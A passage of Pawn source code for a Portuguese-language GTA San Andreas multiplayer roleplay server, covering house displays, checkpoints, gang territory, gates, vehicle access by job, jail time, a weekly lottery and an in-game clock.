					    	OS = onsale ? ("Sim") : ("Nao");
				    		format(msg, sizeof msg, "~b~Proprietário:~n~~w~%s~n~~b~Valor:~n~~w~$%d,00~n~~b~A venda:~n~~w~%s", 		hGetString(hpath, "Owner"),
       																																hGetInt(hpath, "Value"),
				    	                                                                                                        	OS);
						}
						else
						{
						    format(msg, sizeof msg, "~g~Casa a venda~n~~b~Valor:~n~~w~$%d,00~n~~b~Tratar com:~n~~w~%s", 			hGetInt(hpath, "Value"),
																																	hGetString(hpath, "Owner"));
						}

						TextDrawSetString(tdhouse[n], TEXT(msg));
						TextDrawShowForPlayer(n, tdhouse[n]);
						TextDrawShowForPlayer(n, tdjoin);
						PlayerPlaySound(n, 1139, 0.0, 0.0, 0.0);
					}
				}
			}

			else
			{
				if(House[n] != -1)
				{
				    new hpath[128];
			    	new value, int;

			    	hpath = GetHouseFilePath(House[n]);
			    	value = hGetInt(hpath, "Value");
			    	int = -1;

			    	for(new house = 0; house < sizeof HouseInteriors; house++)
			    	{
			    	    if(HouseInteriors[house][hintValue] == value)
			    	    {
			    	        int = house;
			    	        break;
			    	    }
			    	}

					if(int != -1)
					{
					    TextDrawHideForPlayer(n, tdexit);

					    if(GetDistance(X, Y, Z, HouseInteriors[int][hintX], HouseInteriors[int][hintY], HouseInteriors[int][hintZ]) <= 2.5)
					        TextDrawShowForPlayer(n, tdexit);
					}
				}
			}
			
//CHECKPOINTS

			new cpid;
            new Float:dis;

			cpid = -1;
            dis = 1000.000;
			GetPlayerPos(n, X, Y, Z);

			for(new cp = 0; cp < sizeof Checkpoints; cp++)
			{
			    new world;
			    new Float:d;

				if(GetPlayerInterior(n) != Checkpoints[cp][cpInt])
					continue;

				world = Checkpoints[cp][cpVirtualWorld];

				if(world != 0 && GetPlayerVirtualWorld(n) != world)
				    continue;

				d = GetDistance(X, Y, Z, Checkpoints[cp][cpX], Checkpoints[cp][cpY], Checkpoints[cp][cpZ]);

				if(d < dis && d < Checkpoints[cp][cpRadi])
				{
				    cpid = cp;
					dis = d;
				}
			}

			if(cpid != Checkpoint[n])
			{
			    DisablePlayerCheckpoint(n);
                Checkpoint[n] = cpid;

			    if(cpid != -1)
			    {
					CheckpointStatus[n] = Checkpoints[cpid][cpId];
			    	SetPlayerCheckpoint(n, Checkpoints[cpid][cpX], Checkpoints[cpid][cpY], Checkpoints[cpid][cpZ], Checkpoints[cpid][cpSize]);
				}

				else
					CheckpointStatus[n] = CHECKPOINT_NONE;
			}
			
//ZONES

            GetPlayerWorldPos(n, X, Y, Z);

			if(Zone[n] != -1)
   			{
				if(	X < GangZones[Zone[n]][gzMinX] ||
				    X > GangZones[Zone[n]][gzMaxX] ||
				    Y < GangZones[Zone[n]][gzMinY] ||
				    Y > GangZones[Zone[n]][gzMaxY] ||
					House[n] !=	-1	)
				{
				    Zone[n] = -1;
				    GangAttack[n] = -1;
				    DeleteTimer(GangAttackTimer[n]);
				    TextDrawHideForPlayer(n, tdzone[n]);
				}
			}

			else
			{
			    if(House[n] != -1)
			        continue;

				for(new z = 0; z < sizeof GangZones; z++)
				{
					if( X >= GangZones[z][gzMinX] &&
					    X <= GangZones[z][gzMaxX] &&
					    Y >= GangZones[z][gzMinY] &&
					    Y <= GangZones[z][gzMaxY]   	)
					{
						new pgang, domain, amount;

						Zone[n] = z;
						pgang = GetPlayerGang(n);
						domain = GetZoneDomain(z);
                        
					    if(pgang != 0 && pgang != domain)
					    {
					    	for(new p = 0; p < MAX_SLOTS; p++)
					    	{
					    	    if(IsPlayerConnected(p) && IsPlayerLogged(p) && GetPlayerGang(p) == domain)
					    	    {
					    	        if(Zone[p] == z)
					    	        {
					    	            amount = 0;
					    	            break;
					    	        }

					    	        amount++;
								}
					    	}

					    	if(amount > 2)
					    	{
								SendClientMessage(n, COLOUR_SKY_BLUE, "Você pode atacar este território, apenas permaneça nele...");
								GangAttack[n] = -1;
								GangAttackTimer[n] = SetTimerEx("AttackTerritory", 60000, false, "d", n);
					    	}
						}

						TextDrawSetString(tdzone[n], "_");
					    TextDrawShowForPlayer(n, tdzone[n]);
						UpdatePlayerZoneText(n);
					    break;
					}
				}
			}
		}
	}
}

public GateHandler()
{
	new Float:X, Float:Y, Float:Z, open, status, nclose;
	
	for(new g = 0; g < sizeof Gates; g++)
	{
	    open = (Gates[g][gParams] >> 1) & 0x1;
		status = Gates[g][gParams] & 0x1;
	    nclose = 0;
	    
	    if(status == 0)
	    {
	        for(new n = 0; n < MAX_SLOTS; n++)
			{
  				if(IsPlayerConnected(n) && IsPlayerLogged(n))
	    		{
					if(g == 0)
					{
					    if(!IsPlayerCop(n))
					    {
					    	if(!IsPlayerInAnyVehicle(n))
					    	    continue;

							new Float:VX, Float:VY, Float:VZ;

							GetVehiclePos(GetPlayerVehicleID(n), VX, VY, VZ);

							if(VX < 1537.9198 || VX > 1611.7349 || VY < -1721.5104 || VY > -1602.9403)
			    				continue;
						}
					}
					
	    		    if(g == 1 && !IsPlayerCop(n))
	    		        continue;
	    		        
	    		    GetPlayerPos(n, X, Y, Z);

					if(GetDistance(X, Y, Z, Gates[g][gX], Gates[g][gY], Gates[g][gZ]) < 10.0)
   					{
   					    if(open == 0)
  		    				OpenGate(g);
						else
						    nclose = 1;
						    
						break;
					}
	    		}
			}
			
			if(open == 1 && nclose == 0)
			    CloseGate(g);
		}
	}
}

public OnVehicleSpawn(vehicleid)
{
	if(IsPlayerVehicle(vehicleid))
	{
		new vpath[128];
		new colours[2];
		
	    vpath = GetVehicleFilePath(vehicleid);
	    GetVehicleColours(vehicleid, colours[0], colours[1]);
	    
		SetVehicleNumberPlate(vehicleid, hGetString(vpath, "NumberPlate"));
		ChangeVehicleColour(vehicleid, colours[0], colours[1]);
		LoadVehicleComponents(vehicleid);
	}
	
	else
	{
	    new plate[128];
	    
	    format(plate, sizeof plate, "VSR %d", vehicleid + 1000);
	    SetVehicleNumberPlate(vehicleid, plate);
	}
}

public OnVehicleDeath(vehicleid, killerid)
{
	new xpath[128];
	new model, toy;
	
	model = GetVehicleModel(vehicleid);
	
	if(IsRCModel(model))
	{
	    for(new n = 0; n < MAX_SLOTS; n++)
	    {
			if(IsPlayerConnected(n) && IsPlayerLogged(n) && CurrentToy[n] == vehicleid)
			{
			    xpath = GetPlayerXFilePath(n);

    			for(new t = 0; t < sizeof RCs; t++)
				{
				    if(RCs[t] == model)
				    {
				        toy = t;
				        break;
				    }
				}
				
			    RemovePlayerFromVehicle(n);
			    DestroyVehicle(vehicleid);
			    CurrentToy[n] = -1;
			    hSetInt(xpath, "Toys", hGetInt(xpath, "Toys") & ~(1 << toy));
                DrawTextForPlayer(n, "Brinquedo destruído.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
			}
	    }
	}
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	if(!IsPlayerAdmin(forplayerid))
	{
	    for(new vfs = 0; vfs < sizeof VehiclesForSale; vfs++)
		{
	    	if(vehicleid == VehiclesForSale[vfs][osVehId])
	    	{
	    	    SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);
	    	    return 1;
	    	}
		}
	
	    for(new dsc = 0; dsc < sizeof DRIVING_SCHOOL_CAR; dsc++)
	    {
	        if(vehicleid == DRIVING_SCHOOL_CAR[dsc])
	        {
	            if(TestPlayerT == forplayerid)
	                SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 0);

				else
				    SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);

				return 1;
	        }
	    }
	    
	    for(new dsb = 0; dsb < sizeof DRIVING_SCHOOL_BOAT; dsb++)
	    {
	        if(vehicleid == DRIVING_SCHOOL_BOAT[dsb])
	        {
	            if(TestPlayerN == forplayerid)
	                SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 0);

				else
				    SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);

				return 1;
	        }
	    }
	    
	    for(new dsp = 0; dsp < sizeof DRIVING_SCHOOL_PLANE; dsp++)
	    {
	        if(vehicleid == DRIVING_SCHOOL_PLANE[dsp])
	        {
	            if(TestPlayerA == forplayerid)
	                SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 0);

				else
				    SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);

				return 1;
	        }
	    }
	    
	    if(vehicleid == ICE_CREAM)
	    {
	        if(Submission[ICE_CREAM] == forplayerid)
	            SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 0);
	            
	        else
	            SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);
	            
            return 1;
	    }
	    
	    if(vehicleid == CEMENT)
	    {
	        if(Submission[CEMENT] == forplayerid)
	            SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 0);

	        else
	            SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);
	            
            return 1;
	    }
	    
	    if(vehicleid == IML)
	    {
	        if(Submission[IML] == forplayerid)
	            SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 0);

	        else
	            SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);
	            
            return 1;
	    }
	    
	    if(vehicleid == POST)
	    {
	        if(Submission[POST] == forplayerid)
	            SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 0);

	        else
	            SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);
	            
			return 1;
	    }
	    
	    if(IsPlayerVehicle(vehicleid))
	    {
	        new vpath[128];
			new kit;

            vpath = GetVehicleFilePath(vehicleid);
            
			if(hGetInt(vpath, "Seized"))
			{
			    SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);
			    return 1;
			}
			
			kit = hGetInt(vpath, "Params") & 3;

			if(kit == 3)
			{
			    if(strcmp(PlayerName(forplayerid), hGetString(vpath, "Owner"), true))
					SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);
			}
	    }
	    
	    else
	    {
			new jobid;
				
			jobid = hGetInt(GetPlayerXFilePath(forplayerid), "Job");
	
			if(	(IsJobVehicle(vehicleid, TAXI) 				&& 		jobid != JOB_CABBIE) ||
   				(IsJobVehicle(vehicleid, POLICE_CAR) 		&& 		jobid != JOB_POLICE && jobid != JOB_SWAT && jobid != JOB_DELEGATE) ||
       			(IsJobVehicle(vehicleid, SCOOTER) 			&& 		jobid != JOB_PIZZABOY) ||
          		(IsJobVehicle(vehicleid, BUS) 				&& 		jobid != JOB_MACHINIST) ||
            	(IsJobVehicle(vehicleid, TRAIN) 			&& 		jobid != JOB_MACHINIST) ||
             	(IsJobVehicle(vehicleid, AMBULANCE) 		&& 		jobid != JOB_PARAMEDIC) ||
             	(IsJobVehicle(vehicleid, NEWS) 				&& 		jobid != JOB_JOURNALIST) ||
              	(IsJobVehicle(vehicleid, TOWTRUCK) 			&& 		jobid != JOB_MECHANIC) ||
              	(IsJobVehicle(vehicleid, ROADTRAIN) 		&& 		jobid != JOB_TRUCKER) ||
              	(IsJobVehicle(vehicleid, FARM) 				&& 		jobid != JOB_FARMER) ||
              	(IsJobVehicle(vehicleid, SMUGGLING) 		&& 		jobid != JOB_SMUGGLER) ||
              	(IsJobVehicle(vehicleid, SECURITY) 			&& 		jobid != JOB_SECURITY) ||
              	(IsJobVehicle(vehicleid, STRETCH) 			&& 		jobid != JOB_DRIVER) ||
              	(IsJobVehicle(vehicleid, PLANE) 			&& 		jobid != JOB_PILOT) ||
               	(IsJobVehicle(vehicleid, TRASHMASTER) 		&& 		jobid != JOB_GARBAGE))
					SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);
			else
			{
			    for(new n = 0; n < MAX_SLOTS; n++)
			    {
					if(	n != forplayerid && IsPlayerConnected(n) && IsPlayerLogged(n) &&
						WorkVehicle[n] == vehicleid && IsPlayerInVehicle(n, vehicleid)	)
					{
					    SetVehicleParamsForPlayer(vehicleid, forplayerid, 0, 1);
					    break;
					}
			    }
			}
	    }
	}

	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
	SendClientMessage(playerid, COLOUR_RED, "Essa loja não funciona aqui, vá na Virtual Shop.");
	RemoveVehicleComponent(vehicleid, componentid);
	LoadVehicleComponents(vehicleid);
	return 1;
}

public TakePickup(pickupid)
	DestroyPickup(pickupid);
	
public Hour()
{
	new xpath[128], string[128];
	new bstart, btime;
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n))
	    {
	    	xpath = GetPlayerXFilePath(n);
			bstart = hGetInt(xpath, "BustedStart");
			btime = hGetInt(xpath, "BustedTime");
	        
	        if(Audience[0] != n && Audience[1] != n && btime > 0)
	        {
	            new time[2][5], result, offset;

				result = 0;
				getdate(time[0][2], time[0][1], time[0][0]);
				gettime(time[0][3], time[0][4], offset);
				time[1][0] = (bstart & 0xF) + MYEAR;
				time[1][1] = (bstart >> 4) & 0xF;
				time[1][2] = (bstart >> 8) & 0x1F;
				time[1][3] = (bstart >> 13) & 0x1F;
				time[1][4] = (bstart >> 18) & 0x3F;
				
				offset = 1;
				for(new t = 0; t < 2; t++)
				{
				    time[t][1] = (time[t][1] - 1) * 30;
				    time[t][1] += time[t][1] / 2;
				    
				    if(time[t][1] > 2)
				        time[t][1] -= 2;
				        
					if(t == 1)
					    offset = -1;
					    
                    result += offset * time[t][0] * 525600;
					result += offset * (time[t][1] + time[t][2]) * 1440;
					result += offset * time[t][3] * 60;
					result += offset * time[t][4];
				}
				
	            if(result >= btime)
	            {
	                hSetInt(xpath, "BustedStart", 0);
	                hSetInt(xpath, "BustedTime", 0);
	                SetPlayerInterior(n, 6);
	                SetPlayerPos(n, 266.7647, 77.7550, 1001.0390);
	                SetPlayerVirtualWorld(n, 0);
	                UpdatePlayerSpawn(n);
	                DrawTextForPlayer(n, "Solto.", COLOUR_RED, TEXTDRAW_STYLE_3, 4000);
	            }

				else
				{
					format(string, sizeof string, "Mais um minuto se passou... Tempo restante: %dmins", btime - result);
					SendClientMessage(n, COLOUR_WHITE, string);
				}
			}
   		
	    	if(pDrunk[n] > 0)
	    	{
	    	    pDrunk[n] -= 2083;

		        if(pDrunk[n] < 0)
		            pDrunk[n] = 0;
		    }
		}
	}
}

stock VirtualLoto()
{
	if(!fexist(BETS_FILE_PATH))
	    return;
	    
	new File:bfile, File:wfile;
	new tmp[128], string[128], name[128];
	new number1, number2, jackpot, winners;
	
	number1 = random(30) + 1;

	do
	    number2 = random(30) + 1;
 	while(number2 == number1);
 	
 	if(number1 > number2)
 	{
  		number1 += number2;
		number2 = number1 - number2;
		number1 -= number2;
 	}
 	
 	bfile = fopen(BETS_FILE_PATH, io_read);
 	wfile = fopen(WINNERS_FILE_PATH, io_write);
 	
 	while(fread(bfile, tmp, sizeof tmp))
 	{
 	    new bet, n1, n2, idx;
 	    
 	    name = strtok(tmp, idx, HSYS_SEP_CHAR);
 	    bet = strval(strtok(tmp, idx, HSYS_SEP_CHAR));
 	    n1 = (bet >> 16) & 0xFFFF;
		n2 = bet & 0xFFFF;
		
		if(n1 == number1 && n2 == number2)
		{
		    fwrite(wfile, name);
		    fwrite(wfile, "\r\n");
		    winners++;
		}
 	}
 	
 	fclose(bfile);
 	fclose(wfile);
 	
 	jackpot = hGetInt(GLOBAL_FILE_PATH, "Jackpot");
 	jackpot += random(10001) + 5000;
 	jackpot -= jackpot % 1000;
 	
 	if(jackpot > 100000)
		jackpot = 100000;
		
 	format(string, sizeof string, "VIRTUAL'LOTO - [ PRÊMIO: $%d,00 dólares ] - [ NÚMEROS: %d e %d ] - RESULTADO:", jackpot, number1, number2);
 	SendClientMessageToAll(COLOUR_WHITE, string);
 	
 	if(winners > 0)
 	{
		if(winners != 1)
		{
		    jackpot /= winners;
 	    	format(string, sizeof string, "%d vencedores da loteria, parabéns a todos, o prêmio foi dividido.", winners);
 	    	SendClientMessageToAll(COLOUR_WHITE, string);
		}
		
		else
		{
		    format(string, sizeof string, "Apenas um vencedor da loteria, parabéns %s, o prêmio é todo seu!", name);
 	    	SendClientMessageToAll(COLOUR_WHITE, string);
		}
		
		wfile = fopen(WINNERS_FILE_PATH, io_read);
		
		while(fread(wfile, tmp, sizeof tmp))
		{
		    new xpath[128];

			StripNewLine(tmp);
		    xpath = GetPlayerNameXFilePath(tmp);
		    hSetInt(xpath, "Bank", hGetInt(xpath, "Bank") + jackpot);
		    format(string, sizeof string, "[ Parabéns! Você ganhou na loteria e recebeu o prêmio (Banco +$%d,00 dólares) ]", jackpot);
		    SendPhoneMessage(tmp, "Virtual'Loto", string);
		}
		
		fclose(wfile);
		hSetInt(GLOBAL_FILE_PATH, "Jackpot", 0);
	 }
 	
 	else
 	{
 	    hSetInt(GLOBAL_FILE_PATH, "Jackpot", jackpot);
 	    SendClientMessageToAll(COLOUR_WHITE, "Nenhum vencedor, talvez na próxima, o prêmio será acumulado com o do próximo sorteio...");
 	}
 	
 	fremove(WINNERS_FILE_PATH);
 	fremove(BETS_FILE_PATH);
}

public ServerWarning()
{
	new warno;
	
	warno = random(4);
	SendClientMessageToAll(COLOUR_WHITE, "Virtual Society Server informa:");
	
	if(warno == 0)
		SendClientMessageToAll(COLOUR_RED, "É proibido o uso de cheats, hacks ou algo do gênero, em caso de uso = BAN");
	
	if(warno == 1)
		SendClientMessageToAll(COLOUR_RED, "Tentativas de burlar sistemas = BAN");
	    
	if(warno == 2)
		SendClientMessageToAll(COLOUR_RED, "Flood, Ofensas, Desrespeito, Anúncios sem autorização = KICK, se insistir = BAN");
		
	if(warno == 3)
	    SendClientMessageToAll(COLOUR_RED, "Visite nosso fórum: http://forum.virtualsocietyrpg.com");
}
	
public Time()
{
	new hour, mins;
	
	CurrentTime++;
	hour = CurrentHour;
	mins = CurrentMinute;
	
    for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && IntroductionPart[n] == 0)
	    {
			if(GChat[n] > 0)
			    GChat[n]--;
			    
			if(Announce[n] > 0)
			    Announce[n]--;
			
			if(TerminalCounter[n] > 0)
			    TerminalCounter[n]--;
			    
	        if(mins == 0)
	        {
	            SavePlayerData(n);
				IncreasePlayerCounter(n);
			}
			
			if(mins % 2 == 0)
			{
			    new dcounter;

				dcounter = GetPlayerCounter(n, COUNTER_DRUG);
				
			    if(random(4) == 0)
			    {
            		if(!IsPlayerInAnyVehicle(n) && pDrunk[n] >= 10000 && Dying[n] == 0 && Limp[n] == 0)
                	    ApplyAnimation(n, "PED", "WALK_DRUNK", 4.1, 1, 1, 1, 1, 1, 1);
                	    
					if(Cigar[n] <= 0)
					{
						if(dcounter > 0 && dcounter < 10)
						{
						    new pck;
						    new Float:X, Float:Y, Float:Z, Float:H;

						    GetPlayerPos(n, X, Y, Z);
							GetPlayerHealth(n, H);
							
							H -= 2.0;
							
							if(H < 10.0)
							    H = 10.0;
						    
	                        pck = CreatePickup(1241, 2, X, Y, Z);
    	                    SetPlayerWeather(n, 3004);
    	                    SetPlayerSysHealth(n, H);
    	                    
    	                    for(new t = 0; t < 4; t++)
    	                        DrawCustomTextForPlayer(n, "!!!!Você precisa de drogas!!!!", COLOUR_RED, 318.0 + float(random(51) - 25), 140.0 + float(random(51) - 25), 2, 0.5, 2.0, 1, 2, 1500);
    	                        
        	                SetTimerEx("TakePickup", 1000, false, "d", pck);
						}
					}
				}
			}
			
			SetPlayerScore(n, hGetInt(GetPlayerXFilePath(n), "Level"));
			SetPlayerTime(n, hour, mins);
   		}
	}
		
	if(mins == 0)
	{
	    if(CurrentTime >= 1440)
	    {
	        for(new ds = 0; ds < sizeof DrinkSupply; ds++)
	            DrinkSupply[ds] = 0;
	            
	        CurrentTime = 0;
			CurrentDay = (CurrentDay + 1) % 7;

#if SHOW_WEEKDAY == true

			TextDrawSetString(tdweek, Days[CurrentDay]);
			
#endif

		}
		
		else if(CurrentTime == 1260)
		{
		    if(CurrentDay == 0)
				VirtualLoto();
		}
		
		else if(CurrentTime == 1200)
		{
		    new string[128];
		    
		    CurrentWeather = random(sizeof Weathers);
		    format(string, sizeof string, "Virtual News - Previsão do tempo para amanhã: %s", Weathers[CurrentWeather][wInfo]);
		    SendClientMessageToAll(COLOUR_WHITE, string);
		    SendClientMessageToAll(COLOUR_WHITE, Weathers[CurrentWeather][wDescription]);
		}

		else if(CurrentTime == 1080)
		{
		    if(CurrentDay == 6)
		    {
		    	new string[128];
		    	new result;
		    	new bool:done;

				done = false;

				for(new com = 1; com < sizeof Companies; com++)
				{
					if(GetCompanyResult(com, result))
					{
					    if(!done)
					        SendClientMessageToAll(COLOUR_GOLD, "[--------------------] Empresas - Resultados: [--------------------]");

						format(string, sizeof string, "%s \"%s\"", Companies[com][cType], Companies[com][cName]);
				    
					    if(result > 0)
					        format(string, sizeof string, "%s -> Lucro: $%d,00 dólares", string, result);

						else
						    format(string, sizeof string, "%s -> Prejuízo: $%d,00 dólares", string, -result);
					    
						SendClientMessageToAll(COLOUR_GOLD, string);
						SendCompanyResult(com, result);
						done = true;
					}
				}
			}
		}
		
		else if(CurrentTime == 420)
		{
			SetWeather(Weathers[CurrentWeather][wWeatherId]);

			for(new c = 1; c < sizeof Safes; c++)
			{
			    Safes[c][sMoney] += 100 + (random(7) * 50);
			    
			    if(Safes[c][sMoney] > Safes[c][sLimit])
			        Safes[c][sMoney] = Safes[c][sLimit];
			}
			
			if(random(3) < 2)
			{
			    new string[128];
			    
				ChopValue = 500 + (random(11) * 100);
				format(string, sizeof string, "[INFO] Aew! Maluco tamo oferecendo $%d pila por qualqué lata, se tu tiver afim... Só trazer.", ChopValue);
				SendClientMessageToJob(JOB_DRUG_DEALER, COLOUR_DRUG_DEALER, string);
			}
		}
		
		SaveGlobalData();
	    SetWorldTime(hour);
	}
}
